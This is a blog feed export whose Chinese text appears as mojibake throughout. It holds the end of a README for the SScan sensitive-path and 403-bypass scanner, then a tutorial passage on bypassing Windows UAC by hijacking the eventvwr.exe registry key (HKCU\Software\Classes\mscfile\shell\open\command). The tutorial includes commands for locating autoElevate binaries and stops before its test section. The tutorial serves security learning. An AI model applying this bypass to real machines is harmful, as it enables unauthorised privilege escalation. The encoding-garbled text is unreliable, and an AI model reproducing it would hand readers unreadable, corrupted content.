<li><input disabled="" type="checkbox"> <del>å°†<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a>é¡¹ç›®ä¸­çš„ä¸€äº›åŠŸèƒ½é›†æˆè¿›å»ï¼Œèƒ½å¤Ÿå¯¹jsæ–‡ä»¶ä¸­çš„æ•æ„Ÿä¿¡æ¯ã€APIè¿›è¡Œæµ‹è¯•</del>ï¼Œæ·»åŠ æ­¤åŠŸèƒ½æœ‰ç‚¹è‡ƒè‚¿ï¼Œè€Œä¸”æœ‰ç°æˆçš„(ä¸æ˜¯æˆ‘æ‡’)ï¼Œ1.0ç‰ˆæœ¬å‡†å¤‡æ·»åŠ æŒ‡çº¹è¯†åˆ«ï¼Œè®°å½•ä¸€ä¸ªç›®æ ‡çš„å„ç§ä¿¡æ¯ï¼Œå¹¶ç”ŸæˆæŠ¥å‘Šï¼Œåç»­å¯ä»¥ç­›é€‰å‡ºç›®æ ‡ä½¿ç”¨<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a> è¿›è¡Œæ‰¹é‡æ‰«æ</li>
<li><input disabled="" type="checkbox"> 1.0ç‰ˆæœ¬æ·»åŠ æŒ‡çº¹è¯†åˆ«ï¼Œè®°å½•ä¸€ä¸ªç›®æ ‡çš„å„ç§ä¿¡æ¯ï¼Œå¹¶ç”ŸæˆæŠ¥å‘Šã€‚</li>
<li><input disabled="" type="checkbox"> ç»§ç»­ä¼˜åŒ–å„æ¨¡å—</li>
</ul>
<h2 id="rulesç›®å½•ä¸‹çš„è§„åˆ™æè¿°"><a href="#rulesç›®å½•ä¸‹çš„è§„åˆ™æè¿°" class="headerlink" title="rulesç›®å½•ä¸‹çš„è§„åˆ™æè¿°"></a>rulesç›®å½•ä¸‹çš„è§„åˆ™æè¿°</h2><ul>
<li><p>black.list è§„åˆ™é»‘åå•ï¼Œå‘½ä¸­åˆ™è·³è¿‡</p>
</li>
<li><p>White.list è§„åˆ™ç™½åå• ï¼Œå‘½ä¸­åˆ™è®¤ä¸ºå­˜åœ¨è–„å¼±ç‚¹ï¼ŒåŠ å…¥ç»“æœ</p>
</li>
<li><p>rulesç›®å½•ä¸‹çš„ä¸€äº›å­—æ®µå«ä¹‰ï¼Œrulesç›®å½•ä¸‹å¸¸è§çš„æ ¼å¼å°±æ˜¯è¿™ç§</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/WEB-INF/applicationContext-slave.xml &#123;tag=&quot;&lt;?xml&quot;&#125; &#123;status=200&#125; &#123;type=&quot;xml&quot;&#125; &#123;root_only&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p><code>/WEB-INF/applicationContext-slave.xml </code>ç›®å½• ï¼Œå¿…æœ‰</p>
</li>
<li><p><code>&#123;tag=&quot;&lt;?xml&quot;&#125; </code>å¯é€‰ï¼Œ å¦‚æœæœ‰çš„è¯ï¼Œä¼šæ¯”å¯¹ response.text ,å³è¿”å›çš„htmlé¡µé¢ä¸­æ˜¯å¦å­˜åœ¨tagï¼Œè‹¥æ²¡æœ‰ï¼Œè®¤ä¸ºä¸å­˜åœ¨è¯¥ç›®å½•ã€‚</p>
</li>
<li><p><code>&#123;status=200&#125; </code>å¯é€‰ï¼Œ ç›®å½•å¯¹åº”çš„çŠ¶æ€ç ï¼Œ ä¹Ÿæ˜¯ ä½œä¸ºåˆ¤æ–­è¯¥ç›®å½•æ˜¯å¦å­˜åœ¨çš„ä¸€ä¸ªæ¡ä»¶ï¼Œä¼šæ¯”å¯¹é¡µé¢çš„çŠ¶æ€ç å’Œè§„åˆ™çš„çŠ¶æ€ç ä¸€è‡´ </p>
</li>
<li><p><code>&#123;type=&quot;xml&quot;&#125;</code> å¯é€‰ï¼Œä¸è¿”å›å¤´ä¿¡æ¯ content-type å­—æ®µæ¯”å¯¹ï¼Œä¹Ÿæ˜¯åˆ¤æ–­ç›®å½•å­˜åœ¨çš„ä¸€ä¸ªæ¡ä»¶</p>
</li>
<li><p><code>&#123;root_only&#125;</code> å¯é€‰ï¼Œ è¿™ä¸ªæ˜¯è¡¨ç¤ºè¯¥ç›®å½•åªåœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹å­˜åœ¨ï¼Œä¹‹åä¸ç½‘ç«™æ ¹ç›®å½•æ‹¼æ¥ï¼Œè¿›è¡Œæ£€æµ‹ï¼Œæ¯”å¦‚ <a href="https://www.baidu.com/WEB-INF/applicationContext-slave.xml">https://www.baidu.com/WEB-INF/applicationContext-slave.xml</a> è¿™æ ·æ£€æŸ¥ä¸€æ¬¡ï¼Œ åœ¨ <a href="https://www.baidu.com/test/">https://www.baidu.com/test/</a> è¿™æ ·çš„äºŒçº§ç›®å½•ï¼Œå¹¶ä¸ä¼šæ‹¼æ¥æ£€æŸ¥ï¼Œæé«˜æ•ˆç‡ ï¼Œ</p>
<p> psï¼šå¿…æœ‰ï¼šæ˜¯æŒ‡å½“æƒ³è¦è‡ªå·±æ·»åŠ è§„åˆ™æ—¶ï¼Œå¿…é¡»æ·»åŠ çš„å­—æ®µï¼Œå¯é€‰ï¼šå¯ä»¥æ²¡æœ‰ï¼Œä½†æƒ³è¦æ›´åŠ å‡†ç¡®ï¼Œæœ€å¥½å†™ä¸Šã€‚</p>
<p> å…·ä½“åŒ¹é…æ£€æµ‹åœ¨<code>lib/common/scanner.py</code> çš„523è¡Œ</p>
</li>
</ol>
</li>
</ul>
<h2 id="å¦‚ä½•ç¼–å†™è„šæœ¬æ’ä»¶"><a href="#å¦‚ä½•ç¼–å†™è„šæœ¬æ’ä»¶" class="headerlink" title="å¦‚ä½•ç¼–å†™è„šæœ¬æ’ä»¶"></a>å¦‚ä½•ç¼–å†™è„šæœ¬æ’ä»¶</h2><p>è¯·å‚è€ƒscriptsæ–‡ä»¶å¤¹ä¸‹çš„æ’ä»¶å†…å®¹ã€‚selfå‚æ•°æ˜¯ä¸€ä¸ªScannerå¯¹è±¡(lib&#x2F;common&#x2F;scanner.py)ï¼Œå¯ä½¿ç”¨Scannerå¯¹è±¡çš„ä»»æ„æ–¹æ³•ã€å±æ€§ã€‚</p>
<p><code>self.host</code> <code>self.port</code> æ˜¯ç›®æ ‡ä¸»æœºå’Œç«¯å£</p>
<p><code>self.ports_open</code> æ˜¯å¼€æ”¾çš„ç«¯å£åˆ—è¡¨ï¼Œæ˜¯æ‰€æœ‰æ’ä»¶å…±äº«çš„ã€‚ ä¸€èˆ¬ä¸åœ¨æ’ä»¶æ‰§è¡Œè¿‡ç¨‹ä¸­å†å•ç‹¬æ‰«æç«¯å£</p>
<p><code>self.session</code> æ˜¯HTTPè¿æ¥æ± </p>
<p><code>self.http_request</code> å¯å‘èµ·HTTP GETè¯·æ±‚</p>
<p><code>self.index_headers</code> <code>self.index_status</code> <code>self.index_html_doc</code> æ˜¯è¯·æ±‚é¦–é¡µåè¿”å›çš„ï¼Œä¸€æ—¦æ‰«æå™¨å‘ç°æœ‰æ’ä»¶ä¾èµ–ï¼Œä¼šé¢„å…ˆè¯·æ±‚é¦–é¡µï¼Œä¿å­˜ä¸‹æ¥ï¼Œè¢«æ‰€æœ‰æ’ä»¶å…¬ç”¨</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://github.com/lijiejie/BBScan.git">BBScan</a></li>
<li><a href="https://github.com/shmilylty/OneForAll.git">oneforall</a> </li>
<li><a href="https://github.com/sting8k/BurpSuite_403Bypasser">BurpSuite_403Bypasser</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247489824&idx=1&sn=83d370a391fa8269c12848d87a62240a&chksm=9b393f91ac4eb687328e676b3ed0710078d5cb2d3185e0d38d5e7bd92403840d0fc224b443ba&mpshare=1&scene=24&srcid=12289jnCaJEnQZ4ZGqKk1uGX&sharer_sharetime=1609151769170&sharer_shareid=6806da86371afa965c2b99ffa8f84bab#rd">è®°ä¸€æ¬¡403ç»•è¿‡æŠ€å·§</a></li>
<li><a href="http://www.langzi.fun/Asyncio%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B.html">Asyncioå¹¶å‘ç¼–ç¨‹</a></li>
<li><a href="https://github.com/test502git/Scanunauthorized">Scanunauthorized</a></li>
<li><a href="https://github.com/timwhitez/Frog-Auth/blob/main/pocs/pocs.py">Frog-Auth</a></li>
</ul>
<h2 id="å…è´£å£°æ˜"><a href="#å…è´£å£°æ˜" class="headerlink" title="å…è´£å£°æ˜"></a>å…è´£å£°æ˜</h2><p>æœ¬å·¥å…·ä»…èƒ½åœ¨å–å¾—è¶³å¤Ÿåˆæ³•æˆæƒçš„ä¼ä¸šå®‰å…¨å»ºè®¾ä¸­ä½¿ç”¨ï¼Œåœ¨ä½¿ç”¨æœ¬å·¥å…·è¿‡ç¨‹ä¸­ï¼Œæ‚¨åº”ç¡®ä¿è‡ªå·±æ‰€æœ‰è¡Œä¸ºç¬¦åˆå½“åœ°çš„æ³•å¾‹æ³•è§„ã€‚<br>    å¦‚æ‚¨åœ¨ä½¿ç”¨æœ¬å·¥å…·çš„è¿‡ç¨‹ä¸­å­˜åœ¨ä»»ä½•éæ³•è¡Œä¸ºï¼Œæ‚¨å°†è‡ªè¡Œæ‰¿æ‹…æ‰€æœ‰åæœï¼Œæœ¬å·¥å…·æ‰€æœ‰å¼€å‘è€…å’Œæ‰€æœ‰è´¡çŒ®è€…ä¸æ‰¿æ‹…ä»»ä½•æ³•å¾‹åŠè¿å¸¦è´£ä»»ã€‚<br>    é™¤éæ‚¨å·²å……åˆ†é˜…è¯»ã€å®Œå…¨ç†è§£å¹¶æ¥å—æœ¬åè®®æ‰€æœ‰æ¡æ¬¾ï¼Œå¦åˆ™ï¼Œè¯·æ‚¨ä¸è¦å®‰è£…å¹¶ä½¿ç”¨æœ¬å·¥å…·ã€‚<br>    æ‚¨çš„ä½¿ç”¨è¡Œä¸ºæˆ–è€…æ‚¨ä»¥å…¶ä»–ä»»ä½•æ˜ç¤ºæˆ–è€…é»˜ç¤ºæ–¹å¼è¡¨ç¤ºæ¥å—æœ¬åè®®çš„ï¼Œå³è§†ä¸ºæ‚¨å·²é˜…è¯»å¹¶åŒæ„æœ¬åè®®çš„çº¦æŸã€‚</p>
<h2 id="Starè¶‹åŠ¿"><a href="#Starè¶‹åŠ¿" class="headerlink" title="Starè¶‹åŠ¿"></a>Starè¶‹åŠ¿</h2><p><a href="https://starchart.cc/yhy0/SScan"><img src="https://starchart.cc/yhy0/SScan.svg" alt="Stargazers over time"></a>
      </p>
]]></content>
      <categories>
        <category>GitHubå·¥å…·</category>
      </categories>
      <tags>
        <tag>GitHubå·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>Windowsææƒ-BypassUACä¹‹åŠ«æŒæ³¨å†Œè¡¨å®éªŒ</title>
    <url>/2021/01/19/Windows%E6%8F%90%E6%9D%83-BypassUAC%E4%B9%8B%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<blockquote>
<p>  å‡†å¤‡PPTçš„è¿‡ç¨‹ä¸­ï¼Œè¿˜æ˜¯å­¦åˆ°ä¸å°‘ä¸œè¥¿çš„</p>
</blockquote>
<h3 id="1-UAC-ç®€ä»‹"><a href="#1-UAC-ç®€ä»‹" class="headerlink" title="1. UAC ç®€ä»‹"></a>1. UAC ç®€ä»‹</h3><p>**UAC(User Account Controlï¼Œç”¨æˆ·è´¦å·æ§åˆ¶)**æ˜¯å¾®è½¯ä¸ºäº†æé«˜ç³»ç»Ÿå®‰å…¨æ€§åœ¨Windows Vistaä¸­å¼•å…¥çš„æŠ€æœ¯ã€‚UACè¦æ±‚ç”¨æˆ·åœ¨æ‰§è¡Œå¯èƒ½å½±å“è®¡ç®—æœºè¿è¡Œçš„æ“ä½œæˆ–åœ¨è¿›è¡Œå¯èƒ½å½±å“å…¶ä»–ç”¨æˆ·çš„è®¾ç½®ä¹‹å‰ï¼Œæ‹¥æœ‰ç›¸åº”çš„æƒé™æˆ–è€…ç®¡ç†å‘˜å¯†ç ã€‚UACåœ¨æ“ä½œå¯åŠ¨å‰å¯¹ç”¨æˆ·èº«ä»½è¿›è¡ŒéªŒè¯ï¼Œä»¥é¿å…æ¶æ„è½¯ä»¶å’Œé—´è°è½¯ä»¶åœ¨æœªç»è®¸å¯çš„æƒ…å†µä¸‹åœ¨è®¡ç®—æœºä¸Šè¿›è¡Œå®‰è£…æ“ä½œæˆ–è€…å¯¹è®¡ç®—æœºè®¾ç½®è¿›è¡Œæ›´æ”¹ã€‚</p>
<p>åœ¨Windows VistaåŠä»¥åçš„ç‰ˆæœ¬ä¸­ï¼Œå¾®è½¯è®¾ç½®äº†å®‰å…¨æ§åˆ¶ç­–ç•¥ï¼Œåˆ†ä¸ºé«˜ã€ä¸­ã€ä½ä¸‰ä¸ªç­‰çº§ã€‚é«˜ç­‰çº§çš„è¿›ç¨‹æœ‰ç®¡ç†å‘˜æƒé™ï¼›ä¸­ç­‰çº§çš„è¿›ç¨‹æœ‰æ™®é€šç”¨æˆ·æƒé™ï¼›ä½ç­‰çº§çš„è¿›ç¨‹ï¼Œæƒé™æ˜¯æœ‰é™çš„ï¼Œä»¥ä¿è¯ç³»ç»Ÿåœ¨å—åˆ°å®‰å…¨å¨èƒæ—¶é€ æˆçš„æŸå®³æœ€å°ã€‚åœ¨æƒé™ä¸å¤Ÿçš„æƒ…å†µä¸‹ï¼Œè®¿é—®ç³»ç»Ÿç£ç›˜çš„æ ¹ç›®å½•( ä¾‹å¦‚ C:\)ã€Windowsç›®å½•ï¼Œä»¥åŠè¯»å†™ç³»ç»Ÿç™»å½•æ•°æ®åº“ç­‰æ“ä½œï¼Œéƒ½éœ€è¦ç»å¸¸UAC(User Account Controlï¼Œç”¨æˆ·è´¦å·æ§åˆ¶)çš„è®¤è¯ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084909.png" alt="image-20210118155254114"></p>
<p><strong>éœ€è¦UACçš„æˆæƒæ‰èƒ½è¿›è¡Œçš„æ“ä½œåˆ—è¡¨å¦‚ä¸‹ï¼š</strong></p>
<ul>
<li>é…ç½®Windows Update</li>
<li>å¢åŠ ã€åˆ é™¤è´¦æˆ·</li>
<li>æ›´æ”¹è´¦æˆ·ç±»å‹</li>
<li>æ›´æ”¹UACçš„è®¾ç½®</li>
<li>å®‰è£…ActiveX</li>
<li>å®‰è£…ã€å¸è½½ç¨‹åº</li>
<li>å®‰è£…è®¾å¤‡é©±åŠ¨ç¨‹åº</li>
<li>å°†æ–‡ä»¶ç§»åŠ¨&#x2F;å¤åˆ¶åˆ°Program Filesæˆ–Windowsç›®å½•ä¸‹</li>
<li>æŸ¥çœ‹å…¶å®ƒç”¨æˆ·çš„æ–‡ä»¶å¤¹</li>
<li>â€¦</li>
</ul>
<p><strong>UACæœ‰å¦‚ä¸‹å››ç§è®¾ç½®è¦æ±‚ï¼š</strong></p>
<ul>
<li><p>å§‹ç»ˆé€šçŸ¥ï¼šè¿™æ˜¯æœ€ä¸¥æ ¼çš„è®¾ç½®ï¼Œæ¯å½“æœ‰ç¨‹åºéœ€è¦ä½¿ç”¨é«˜çº§åˆ«çš„æƒé™æ—¶éƒ½ä¼šæç¤ºæœ¬åœ°ç”¨æˆ·</p>
</li>
<li><p>ä»…åœ¨ç¨‹åºè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºæ—¶é€šçŸ¥æˆ‘ï¼šè¿™æ˜¯UACçš„é»˜è®¤è®¾ç½®ã€‚å½“æœ¬åœ°Windowsç¨‹åºè¦ä½¿ç”¨é«˜çº§åˆ«çš„æƒé™æ—¶ï¼Œä¸ä¼šé€šçŸ¥ç”¨æˆ·ã€‚ä½†æ˜¯ï¼Œå½“ç¬¬ä¸‰æ–¹ç¨‹åºè¦ä½¿ç”¨é«˜çº§åˆ«çš„æƒé™æ—¶ï¼Œä¼šæç¤ºæœ¬åœ°ç”¨æˆ·</p>
</li>
<li><p>ä»…åœ¨ç¨‹åºè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºæ—¶é€šçŸ¥æˆ‘(ä¸é™ä½æ¡Œé¢çš„äº®åº¦)ï¼šä¸ä¸Šä¸€æ¡è®¾ç½®çš„è¦æ±‚ç›¸åŒï¼Œä½†åœ¨æç¤ºç”¨æˆ·æ—¶ä¸é™ä½æ¡Œé¢çš„äº®åº¦</p>
</li>
<li><p>ä»ä¸æç¤ºï¼šå½“ç”¨æˆ·ä¸ºç³»ç»Ÿç®¡ç†å‘˜æ—¶ï¼Œæ‰€æœ‰ç¨‹åºéƒ½ä¼šä»¥æœ€é«˜æƒé™è¿è¡Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084914.png" alt="image-20210119212303742"></p>
</li>
</ul>
<h3 id="2-åˆ©ç”¨ç³»ç»Ÿè‡ªå¸¦çš„UACç™½åå•ç¨‹åºææƒ"><a href="#2-åˆ©ç”¨ç³»ç»Ÿè‡ªå¸¦çš„UACç™½åå•ç¨‹åºææƒ" class="headerlink" title="2. åˆ©ç”¨ç³»ç»Ÿè‡ªå¸¦çš„UACç™½åå•ç¨‹åºææƒ"></a>2. åˆ©ç”¨ç³»ç»Ÿè‡ªå¸¦çš„UACç™½åå•ç¨‹åºææƒ</h3><p>ç”¨æˆ·è´¦æˆ·æ§åˆ¶é™åˆ¶ç€ç¨‹åºä½¿ç”¨é«˜çº§æƒé™æ‰èƒ½è¿›è¡Œçš„æ“ä½œï¼Œä½†æ˜¯ï¼ŒUACåŒæ ·ä¹Ÿä¼šå¯¹ç³»ç»Ÿæœ¬èº«çš„ç¨‹åºé€ æˆå½±å“ï¼Œå¾®è½¯ä¹Ÿä¸å¸Œæœ›è¿è¡Œç³»ç»Ÿç¨‹åºä¹Ÿéœ€è¦è¯¢é—®ç”¨æˆ·ï¼Œå› ä¸ºç³»ç»Ÿç¨‹åºæ˜¯å®‰å…¨çš„ã€‚å› æ­¤ï¼Œå¾®è½¯åˆ™åœ¨ UAC ä¸­æ·»åŠ äº†ç™½åå•æœºåˆ¶ï¼Œå³åœ¨ç³»ç»Ÿä¸­è®°å½•æœ‰ä¸€å¼ è¡¨å•ï¼Œè¡¨å•ä¸­çš„ç³»ç»Ÿç¨‹åºï¼Œå°†ä¸é™åˆ¶å…¶ç›´æ¥æå‡åˆ°ç®¡ç†å‘˜æƒé™ã€‚ ç³»ç»Ÿä¸­çš„ç™½åå•ç¨‹åºæœ‰å¤šä¸ªï¼Œå…¶ä¸­ï¼Œmsconfigã€taskmgrã€perfmonã€cleanmgr ç­‰å¹³æ—¶å¸¸ç”¨çš„ç¨‹åºéƒ½åœ¨å…¶ä¸­ã€‚æ“ä½œç³»ç»Ÿçš„UACç™½åå•ç¨‹åºï¼Œé»˜è®¤ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œï¼Œè€Œä¸”ä¸å¼¹å‡ºUACçª—å£ç¡®è®¤ã€‚è¿™äº›ç™½åå•ç¨‹åºï¼Œéƒ½å…·æœ‰å¾®è½¯çš„ç­¾åæ˜¯æ“ä½œç³»ç»Ÿå¯ä¿¡çš„ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰¾ä¸€äº›ä»¥é«˜æƒé™è¿è¡Œçš„ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰uacæç¤ºçš„è¿›ç¨‹ï¼Œç„¶ååˆ©ç”¨ProcessMonitorå¯»æ‰¾ä»–å¯åŠ¨è°ƒç”¨å´ç¼ºå¤±çš„å¦‚dllã€æ³¨å†Œè¡¨é”®å€¼ï¼Œç„¶åæˆ‘ä»¬æ·»åŠ å¯¹åº”çš„å€¼è¾¾åˆ°bypass uacçš„æ•ˆæœã€‚</p>
<p>ä»¥é«˜æƒé™è¿è¡Œçš„è¿›ç¨‹å›¾æ ‡ä¸€èˆ¬æœ‰å¦‚ä¸‹æ ‡å¿—ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084919.png" alt="image-20210119104903074"></p>
<h3 id="3-æ€ä¹ˆæ‰¾è¿™äº›ç™½åå•ç¨‹åº"><a href="#3-æ€ä¹ˆæ‰¾è¿™äº›ç™½åå•ç¨‹åº" class="headerlink" title="3. æ€ä¹ˆæ‰¾è¿™äº›ç™½åå•ç¨‹åº"></a>3. æ€ä¹ˆæ‰¾è¿™äº›ç™½åå•ç¨‹åº</h3><p>ç™½åå•ç¨‹åºéƒ½æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œå°±æ˜¯å®ƒä»¬éƒ½å…·æœ‰autoElevateå±æ€§ï¼Œè¯¥å±æ€§å¯ç”±ç‰¹å®šå·¥å…·æŸ¥çœ‹ã€‚</p>
<p>åˆ©ç”¨å¾®è½¯è‡ªå¸¦å·¥å…·æ£€æµ‹ç¨‹åºæ˜¯å¦å…·æœ‰autoElevateå±æ€§ï¼Œä»¥eventvwr.exeä¸ºä¾‹ï¼Œè¯¥ç¨‹åºä½äºC:\Windows\System32ç›®å½•ä¸‹ã€‚ä½¿ç”¨å¾®è½¯çš„Sigcheckå·¥å…·å»æŸ¥çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sigcheck.exeï¼šhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/sigcheck</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sigcheck64.exe -m C:\Windows\System32\eventvwr.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084934.png" alt="image-20210119143254956"></p>
<p>åˆ©ç”¨(Strings.exe](<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings)%E5%B7%A5%E5%85%B7%E6%89%BE%E5%87%BA%E6%89%80%E6%9C%89%E5%85%B7%E6%9C%89autoElevate%E5%B1%9E%E6%80%A7%E7%9A%84%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%B0%86strings.exe%E6%94%BE%E5%9C%A8C:/Windows/System32%E7%9B%AE%E5%BD%95%E4%B8%8B">https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings)å·¥å…·æ‰¾å‡ºæ‰€æœ‰å…·æœ‰autoElevateå±æ€§çš„ç¨‹åºï¼Œå°†strings.exeæ”¾åœ¨C:\Windows\System32ç›®å½•ä¸‹</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings.exe -s *.exe | findstr /i autoelevate</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084950.png" alt="image-20210119144326844"></p>
<p>ç³»ç»Ÿåœ¨è°ƒç”¨è¿™äº›é«˜æƒé™ç¨‹åºæ—¶ï¼Œä¼šè°ƒç”¨<code> HKCRï¼ˆ HKEY_CLASSES_ROOTï¼‰</code>ä¸‹çš„é”®å€¼ã€‚ æ‰€ä»¥ï¼Œä¿®æ”¹<code> HKCRï¼ˆ HKEY_CLASSES_ROOTï¼‰</code>ä¸‹çš„é”®å€¼ï¼ŒæŠŠåŸæœ¬çš„é”®å€¼æ”¹ä¸º cmd.exe ç­‰ shell ç¨‹åºã€‚å¦‚æœé«˜æƒé™çš„ç¨‹åºï¼Œåœ¨è¿è¡Œè¿‡ç¨‹ä¸­è°ƒç”¨æ­¤å¤„è¢«ä¿®æ”¹è¿‡çš„é”®å€¼ï¼Œå°±ä¼šä»¥é«˜æƒé™å¯åŠ¨æˆ‘ä»¬è®¾å®šçš„ç¨‹åºã€‚ä»è€Œå®ç°ç»•è¿‡ UACææƒã€‚éš¾ç‚¹åœ¨äºæ‰¾åˆ°æ³¨å†Œè¡¨çš„å…³é”®ä½ç½®ã€‚</p>
<h3 id="4-å¦‚ä½•æ‰¾å¯¹åº”çš„æ³¨å†Œè¡¨ï¼Ÿä»¥äº‹ä»¶æŸ¥çœ‹å™¨ï¼ˆeventvwr-ä¸ºä¾‹"><a href="#4-å¦‚ä½•æ‰¾å¯¹åº”çš„æ³¨å†Œè¡¨ï¼Ÿä»¥äº‹ä»¶æŸ¥çœ‹å™¨ï¼ˆeventvwr-ä¸ºä¾‹" class="headerlink" title="4. å¦‚ä½•æ‰¾å¯¹åº”çš„æ³¨å†Œè¡¨ï¼Ÿä»¥äº‹ä»¶æŸ¥çœ‹å™¨ï¼ˆeventvwr)ä¸ºä¾‹"></a>4. å¦‚ä½•æ‰¾å¯¹åº”çš„æ³¨å†Œè¡¨ï¼Ÿä»¥äº‹ä»¶æŸ¥çœ‹å™¨ï¼ˆeventvwr)ä¸ºä¾‹</h3><p>æ¥ä¸‹æ¥ä½¿ç”¨ <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon">Process Monitor</a> å·¥å…·æ¥æŸ¥çœ‹eventvwrè¿è¡Œæ—¶ï¼Œä¼šè°ƒç”¨å“ªäº›æ–‡ä»¶ã€æŸ¥è¯¢å“ªäº›æ³¨å†Œè¡¨åœ°å€ã€‚ï¼ˆwin7 ä¸Šæ— æ³•ä½¿ç”¨ æç¤ºï¼š unable to load Process Monitor device driverï¼Œéœ€è¦æ›´æ–°ä¸‹é¢è¿™ä¸ªè¡¥ä¸å³å¯ï¼š<a href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148%EF%BC%89">https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148ï¼‰</a></p>
<p>1ã€æ‰“å¼€Process Monitorå·¥å…·åï¼Œè®¾ç½®è¿‡æ»¤è§„åˆ™ï¼Œé€‰æ‹©å·¥å…·æ â€Filterâ€ &#x3D;&#x3D;&gt; â€œFilterâ€¦â€</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085000.png" alt="image-20210119160455408"></p>
<p>è®¾ç½®è¿‡æ»¤è§„åˆ™ï¼Œâ€Process Nameâ€ â€œisâ€ â€œeventvwr.exeâ€ï¼Œç„¶åç‚¹å‡»Addæ·»åŠ è§„åˆ™ï¼Œä¹‹åç‚¹å‡»Applyåº”ç”¨å’ŒOKå³å¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085005.png" alt="image-20210119160612340"></p>
<p>è¿è¡Œeventvwr.exeï¼Œä¹‹åæŸ¥çœ‹Process Monitor ï¼Œä¼šå‡ºç°ä¸€å †ä¸œè¥¿ï¼Œè€Œä¸”å³é”®Properties å¯ä»¥çœ‹åˆ°<code>eventvwr.exe</code>æƒé™ä¸º <code>high</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085012.png" alt="image-20210119161656625"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085019.png" alt="image-20210119164141166"></p>
<p>éš¾ç‚¹å°±åœ¨äºä»è¿™ä¸€å †ä¸œè¥¿ä¸­æ‰¾åˆ°æ³¨å†Œè¡¨çš„å…³é”®ä½ç½®ï¼Œè¿™é‡Œæˆ‘ä¹Ÿå¹¶ä¸ç†Ÿæ‚‰ï¼Œé€šè¿‡æŸ¥æ‰¾æœç´¢ï¼Œå‘ç°å…³é”®ç‚¹ä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKCU\Software\Classes\mscfile\shell\open\command</span><br><span class="line">HKCR\mscfile\shell\open\command</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿›ç¨‹ <code>eventvwr.exe</code> å¯åŠ¨çš„æ—¶å€™ï¼Œé¦–å…ˆæŸ¥æ‰¾æ³¨å†Œè¡¨ä½ç½® <code>HKCU\Software\Classes\mscfile\shell\open\command</code>ã€‚å¦‚æœè¯¥å¤„ä¸ºç©ºï¼Œæ¥ç€æŸ¥æ‰¾æ³¨å†Œè¡¨ä½ç½® <code>HKCR\mscfile\shell\open\command</code>(æ­¤å¤„é»˜è®¤å€¼ä¸º <code>%SystemRoot%\system32\mmc.exe &quot;%1&quot; %*</code>)ï¼Œä»¥é«˜æƒé™å¯åŠ¨ <code>mmc.exe</code>ï¼Œæœ€åæ‰“å¼€ <code>eventvwr.msc</code>ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085025.png" alt="image-20210119211043232"></p>
<p>è¿™é‡Œç”±ç»“æœå‘åŸå› æ¨å¯¼ï¼šå‘ç°å…³é”®å­—ï¼Œ<code>shell</code> ã€<code>command</code> </p>
<p>æç«™ä¸å°±æ˜¯æ‹¿shellï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œä¸å°±æ˜¯æ‰§è¡Œå‘½ä»¤çš„ç‚¹å—ï¼Ÿï¼</p>
<h4 id="4-1-æµ‹è¯•"><a href="#4-1-æµ‹è¯•" class="headerlink" title="4.1 æµ‹è¯•"></a>4.1 æµ‹è¯•</h4><p>å¦‚æœä¿®æ”¹é”®å€¼ <code>HKCU\Software\Classes\mscfile\shell\open\command</code>ï¼Œä½¿å…¶æŸ¥è¯¢ç»“æœä¸º <code>SUCCESS</code>ï¼Œä¼šå¦‚ä½•å‘¢ï¼Ÿ</p>
